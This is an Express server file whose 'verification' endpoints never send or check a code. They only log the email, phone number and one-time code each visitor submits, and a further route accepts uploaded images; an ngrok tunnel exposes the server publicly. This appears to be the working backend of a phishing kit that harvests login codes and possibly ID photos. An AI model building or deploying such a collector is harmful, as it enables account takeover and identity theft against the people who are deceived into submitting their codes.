const express = require('express');
const multer = require('multer');
const cors = require('cors');
let ngrok;
try {
  ngrok = require('ngrok');
} catch (e) {
  ngrok = null; // handle missing ngrok gracefully
}
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// ✅ Automatically disable ngrok in Render or production environments
const isRender = !!process.env.RENDER;
const ENABLE_NGROK =
  !isRender &&
  (process.env.ENABLE_NGROK || 'true').toLowerCase() !== 'false' &&
  (process.env.DISABLE_NGROK || 'false').toLowerCase() !== 'true';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  },
});

const upload = multer({
  storage,
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) cb(null, true);
    else cb(new Error('Only image files are allowed!'), false);
  },
});

// Routes
app.post('/api/send-verification', (req, res) => {
  try {
    console.log('\n=== NEW VERIFICATION REQUEST ===');
    console.log('Timestamp:', new Date().toISOString());
    const { email, phone, type } = req.body;
    console.log('Verification Data:', { type, email, phone });
    console.log('Status: Waiting for verification code...');
    console.log('=== END REQUEST ===\n');

    res.json({
      success: true,
      message: 'Verification data received successfully',
      data: { email, phone, type },
    });
  } catch (error) {
    console.error('Error processing verification request:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/verify-code', (req, res) => {
  try {
    console.log('\n=== VERIFICATION CODE SUBMITTED ===');
    console.log('Timestamp:', new Date().toISOString());
    const { email, phone, type, verificationCode } = req.body;
    console.log('Verification Code Data:', { type, email, phone, verificationCode });
    console.log('=== END REQUEST ===\n');

    res.json({
      success: true,
      message: 'Verification code logged successfully',
      data: { email, phone, type, verificationCode },
    });
  } catch (error) {
    console.error('Error processing verification code:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/upload', upload.single('image'), (req, res) => {
  try {
    console.log('\n=== NEW UPLOAD REQUEST ===');
    console.log('Timestamp:', new Date().toISOString());
    console.log('Form Data:', {
      email: req.body.email || 'Not provided',
      phone: req.body.phone || 'Not provided',
    });
    if (req.file) {
      console.log('File:', {
        original: req.file.originalname,
        saved: req.file.filename,
        size: (req.file.size / 1024).toFixed(2) + ' KB',
      });
    } else console.log('No file uploaded');
    console.log('=== END REQUEST ===\n');

    res.json({
      success: true,
      message: 'Upload successful',
      data: {
        email: req.body.email,
        phone: req.body.phone,
        hasImage: !!req.file,
        imagePath: req.file ? req.file.filename : null,
      },
    });
  } catch (error) {
    console.error('Error processing upload:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/health', (req, res) =>
  res.json({ status: 'OK', timestamp: new Date().toISOString() })
);

app.use('/uploads', express.static(uploadsDir));

// Serve frontend if exists
const possibleDistPaths = [
  path.join(__dirname, '..', 'dist'),
  path.join(process.cwd(), 'dist'),
  path.join(__dirname, 'dist'),
];
let frontendDist = null;
for (const p of possibleDistPaths) {
  if (fs.existsSync(p)) {
    frontendDist = p;
    break;
  }
}

if (frontendDist) {
  console.log('Frontend found, serving static files from', frontendDist);
  app.use(express.static(frontendDist));
  app.get('*', (req, res, next) => {
    if (req.path.startsWith('/api') || req.path.startsWith('/uploads')) return next();
    res.sendFile(path.join(frontendDist, 'index.html'));
  });
} else {
  app.get('/', (req, res) => {
    res.send(
      `<html><body><h1>Backend Running</h1><p>Visit <a href="/api/health">/api/health</a></p></body></html>`
    );
  });
}

// Start server
app.listen(PORT, async () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);

  if (!ENABLE_NGROK) {
    console.log('⚙️ Ngrok disabled (Render or production environment detected)');
    return;
  }

  if (!ngrok) {
    console.log('⚠️ Ngrok not installed, skipping tunnel');
    return;
  }

  try {
    const url = await ngrok.connect({ addr: PORT });
    console.log(`🌍 Ngrok tunnel active: ${url}`);
  } catch (error) {
    console.error('⚠️ Failed to start ngrok:', error.message);
  }
});

process.on('SIGINT', async () => {
  console.log('\nShutting down server...');
  if (ngrok) await ngrok.kill();
  process.exit(0);
});
